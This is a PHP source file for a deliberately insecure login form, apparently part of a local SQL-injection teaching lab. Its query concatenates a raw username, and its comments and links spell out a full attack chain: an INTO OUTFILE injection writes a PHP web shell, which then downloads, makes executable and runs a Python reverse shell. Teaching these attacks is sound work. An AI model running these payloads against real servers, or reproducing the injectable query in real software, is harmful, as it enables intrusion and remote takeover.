<?php

    require 'functions.php';
    require 'config.php';

    // Create a PHP script that will run commands
    // http://192.168.30.99/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;
    //
	// PYTHON BACKDOOR
	//
    // Download Python reverse shell
    // http://192.168.30.99/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py
    //
    // Run new Python backdoor script
    // http://192.168.30.99/images/cmd.php?cmd=/tmp/reverse-shell.py
    //
	// PHP BACKDOOR - tbc
    //
    // Download PHP reverse shell
    // http://192.168.30.99/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.php -O /tmp/reverse-shell.php
    // 
    // Run new PHP backdoor script
    // http://192.168.30.99/images/cmd.php?cmd=python /tmp/reverse-shell.php
    // 

    //file_put_contents('/var/www/web/sql-injection/dump/fpc.txt', "file put contents 2\n");

    $username = $_GET['username'] ?? null;
    $password = $_GET['password'] ?? null;

    $sql = "SELECT * FROM user WHERE username='$username'";

    try {
        $stmt = $db->prepare($sql);
        $stmt->execute();
    } catch(PDOException $ex) {
        echo "Some error occured: $sql\n";
        dd($ex->getMessage());
    }

    if (isset($_GET['username'])) {
        $results = $stmt->fetchAll();

        dd($results);
    }



?>

<h2>Insecure webform</h2>
<p>
    This is a web form that is insecure in the frontend and backend. It doesn't actually attempt to login but is open to SQL Injection which is explained with the examples below.
</p>

<p>
    <h4>Use the `into outfile` MySQL command to create a PHP script on the server that will run commands</h4>
    <a href="http://<?= HOST ?>/login.php?username=damien%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22';'">http://<?= HOST ?>/login.php?username=damien';select "&lt;?php system($_GET['cmd']);" into outfile "/var/www/web/images/cmd.php"';</a>
</p>

<p>
    <h4>Use the newly created script to download a reverse shell</h4>
    <a href="http://<?= HOST ?>/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
</p>

<p>
    <h4>Change the permissions on the reverse shell to make it executable</h4>
    <a href="http://<?= HOST ?>/images/cmd.php?cmd=chmod%20777%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=chmod 777  /tmp/reverse-shell.py</a>
</p>

<p>
    <h4>Run the downloaded reverse shell</h4>
    <a href="http://<?= HOST ?>/images/cmd.php?cmd=python%20/tmp/reverse-shell.py">http://<?= HOST ?>/images/cmd.php?cmd=python /tmp/reverse-shell.py</a>
</p>

<hr />

<form method="GET" action="">
    Username: <input type="text" name="username" /><br />
    Password: <input type="password" name="password" /><br />
</form>
